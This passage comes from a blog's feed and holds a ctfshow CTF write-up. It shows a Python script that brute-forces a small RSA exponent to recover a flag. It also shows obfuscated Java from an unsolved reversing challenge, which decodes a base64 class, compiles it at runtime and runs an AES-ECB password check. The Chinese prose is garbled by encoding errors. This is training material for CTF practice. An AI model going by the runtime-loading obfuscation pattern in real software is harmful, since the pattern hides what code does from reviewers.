comment"># m =365570067986928236989573788230270407130085464313909252527513197832758480604817399268366313889131551088558394832418649150417321940578277210433329648095352247884911033780856767602238960538520312352025465812228462858158997175162265505345470937926646520732298730237509998898024691120409770049168658027104966429925920045510148612448817</span><span class="token comment"># print(long_to_bytes(m))</span><span class="token comment"># å¾—åˆ° n å’Œ c</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»™äº†èŒƒå›´ç›´æ¥çˆ†ç ´då°±è¡Œ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>n <span class="token operator">=</span> <span class="token number">0x846d39bff2e430ce49d3230c7f00b81b23e4f0c733f7f52f6a5d32460e456e5f</span>c <span class="token operator">=</span> <span class="token number">0x4eeec51849a85e5a6566f8d73a74b1e64959aa893f98e01c1e02c3120496f8b1</span><span class="token keyword">for</span> d <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flagï¼š<code>ctfshow&#123;b4n_your_1_b1o0d&#125;</code></p><hr><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="ç­¾åˆ°Â·easyREï¼ˆUnsolvedï¼‰"><a href="#ç­¾åˆ°Â·easyREï¼ˆUnsolvedï¼‰" class="headerlink" title="ç­¾åˆ°Â·easyREï¼ˆUnsolvedï¼‰"></a>ç­¾åˆ°Â·easyREï¼ˆUnsolvedï¼‰</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctfshow</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Writer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span></span><span class="token class-name">Charset</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span></span><span class="token class-name">StandardCharsets</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Locale</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>tools<span class="token punctuation">.</span></span><span class="token class-name">DiagnosticListener</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>tools<span class="token punctuation">.</span></span><span class="token class-name">JavaCompiler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>tools<span class="token punctuation">.</span></span><span class="token class-name">JavaFileObject</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>tools<span class="token punctuation">.</span></span><span class="token class-name">StandardJavaFileManager</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>tools<span class="token punctuation">.</span></span><span class="token class-name">ToolProvider</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Application</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Application</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cN7sber <span class="token operator">=</span> <span class="token string">"D8yDSBCTF"</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bts <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">ssrd_77g</span><span class="token punctuation">(</span><span class="token string">"o0QlJKT2F0MExZMkE9PSI7CiAgICAgICAgU3RyaW5nQnVpbGRlciBj"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> fcys8ss <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>bts<span class="token punctuation">,</span> <span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span><span class="token constant">UTF_8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">JavaCompiler</span> ckcc7sls <span class="token operator">=</span> <span class="token class-name">ToolProvider</span><span class="token punctuation">.</span><span class="token function">getSystemJavaCompiler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">StandardJavaFileManager</span> f8bysc <span class="token operator">=</span> ckcc7sls<span class="token punctuation">.</span><span class="token function">getStandardFileManager</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">DiagnosticListener</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Locale</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Charset</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">MJscysr__p</span> maprys <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MJscysr__p</span><span class="token punctuation">(</span>f8bysc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">JavaFileObject</span> f0gg <span class="token operator">=</span> maprys<span class="token punctuation">.</span><span class="token function">mstrs93_xxr</span><span class="token punctuation">(</span>cN7sber<span class="token punctuation">,</span> fcys8ss<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">JavaFileObject</span><span class="token punctuation">></span></span> clssur <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>f0gg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> scr7 <span class="token operator">=</span> ckcc7sls<span class="token punctuation">.</span><span class="token function">getTask</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Writer</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> maprys<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">DiagnosticListener</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Iterable</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Iterable</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> clssur<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>scr7<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">ClassLoader</span> cl77s <span class="token operator">=</span> maprys<span class="token punctuation">.</span><span class="token function">gcllsr332_newer</span><span class="token punctuation">(</span>cN7sber<span class="token punctuation">,</span> maprys<span class="token punctuation">.</span><span class="token function">gfpr8sr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> cl9fy_ <span class="token operator">=</span> cl77s<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>cN7sber<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> insry <span class="token operator">=</span> cl9fy_<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Method</span> mdr7sfy <span class="token operator">=</span> cl9fy_<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            mdr7sfy<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>insry<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">ssrd_77g</span><span class="token punctuation">(</span><span class="token class-name">String</span> ssr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ssrd_77g base64è§£å‡ºæ¥æ˜¯ä¸€ä¸ªç±»</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span><span class="token class-name">Cipher</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>spec<span class="token punctuation">.</span></span><span class="token class-name">SecretKeySpec</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span></span><span class="token class-name">StandardCharsets</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">SecureRandom</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">D8yDSBCTF</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">P3WSSK</span> <span class="token operator">=</span> <span class="token string">"AES/ECB/PKCS5Padding"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">C89SYS__</span> <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token class-name">C7yyfggl</span> <span class="token operator">=</span> <span class="token constant">C89SYS__</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">N9SSCRT</span> <span class="token operator">=</span> <span class="token string">"0123456789"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">D9UUSACR</span> <span class="token operator">=</span> <span class="token constant">C89SYS__</span> <span class="token operator">+</span> <span class="token class-name">C7yyfggl</span> <span class="token operator">+</span> <span class="token constant">N9SSCRT</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">SecureRandom</span> rf3ffc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SecureRandom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> key <span class="token operator">=</span>  <span class="token function">b3f7a__0x337f2a</span><span class="token punctuation">(</span><span class="token function">a98fac77f__3c2a</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> e3yfbbglsk <span class="token operator">=</span> <span class="token function">b3f7a__0x337f2a</span><span class="token punctuation">(</span><span class="token function">a98fac77f__3c2a</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Scanner</span> scanner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"please input password:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> i3clscwyt <span class="token operator">=</span> scanner<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">e3c7go_to</span><span class="token punctuation">(</span>i3clscwyt<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>e3yfbbglsk<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Login Successful"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Login Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span>  <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token function">b3f7a__0x337f2a</span><span class="token punctuation">(</span><span class="token class-name">String</span> a783c_7fxf__<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">final</span> <span class="token class-name">String</span> f37xcrxedrd_ <span class="token operator">=</span> <span class="token string">"jvjeTQVGcDGPgFeC+E90Pz6wYzjcBK49YDx2W+6YFTjk/wma7Oa5J3O2ns8OptbxyNgIvYJf/J4BRJOat0LY2A=="</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuilder</span> c0fybbg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> l2crsys <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> f117xc <span class="token operator">=</span> f37xcrxedrd_<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">char</span> c <span class="token operator">:</span> f117xc<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            c0fybbg<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">>>></span> <span class="token number">4</span> <span class="token operator">^</span> <span class="token punctuation">(</span>c <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>c <span class="token operator">>>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        l2crsys<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>c0fybbg<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>c0fybbg<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        l2crsys<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>c0fybbg<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>l2crsys<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>c0fybbg<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> l2crsys<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span>  <span class="token class-name">String</span> <span class="token function">a98fac77f__3c2a</span><span class="token punctuation">(</span><span class="token keyword">int</span> length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>length <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"Length must be positive"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuilder</span> s7cyscrs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> randomIndex <span class="token operator">=</span> rf3ffc<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token constant">D9UUSACR</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            s7cyscrs<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token constant">D9UUSACR</span><span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>randomIndex<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> s7cyscrs<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span>  <span class="token class-name">String</span> <span class="token function">e3c7go_to</span><span class="token punctuation">(</span><span class="token class-name">String</span> coysc21k<span class="token punctuation">,</span> <span class="token class-name">String</span> k89csbbv<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>k89csbbv<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span><span class="token constant">UTF_8</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            k89csbbv <span class="token operator">+=</span> k89csbbv<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> keyBytes <span class="token operator">=</span> k89csbbv<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span><span class="token constant">UTF_8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">SecretKeySpec</span> s88vfy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SecretKeySpec</span><span class="token punctuation">(</span>keyBytes<span class="token punctuation">,</span> <span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Cipher</span> c1ppy <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token constant">P3WSSK</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        c1ppy<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token constant">ENCRYPT_MODE</span><span class="token punctuation">,</span> s88vfy<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encryptedBytes <span class="token operator">=</span> c1ppy<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>coysc21k<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span><span class="token constant">UTF_8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>encryptedBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è§‚å¯Ÿä¸€ä¸‹æ ¸å¿ƒé€»è¾‘ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> i3clscwyt <span class="token operator">=</span> scanner<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">e3c7go_to</span><span class="token punctuation">(</span>i3clscwyt<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>e3yfbbglsk<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Login Successful"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Login Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬çš„è¾“å…¥ä¼šåœ¨<code>e3c7go_to</code>è¿›è¡Œ AES åŠ å¯†ï¼Œç„¶åå’Œ e3yfbbglsk å¯¹æ¯”</p><p>ä½†æ˜¯è¿˜æ˜¯çœ‹ä¸æ‡‚é€†å‘ï¼</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å®˜æ–¹wpï¼š&lt;a href=&quot;https://ctf-show.feishu.cn/docx/R6udd58bxoQGQMxFphncZq8rn5e&quot;&gt;https://ctf-show.feishu.cn/docx/R6udd58bxoQGQMxFphncZq8rn5e&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>Oracleæ•°æ®åº“é…ç½®</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/11/08/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/11/08/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE/</id>
    <published>2024-11-07T16:01:28.000Z</published>
    <updated>2024-11-11T03:08:35.041Z</updated>
    
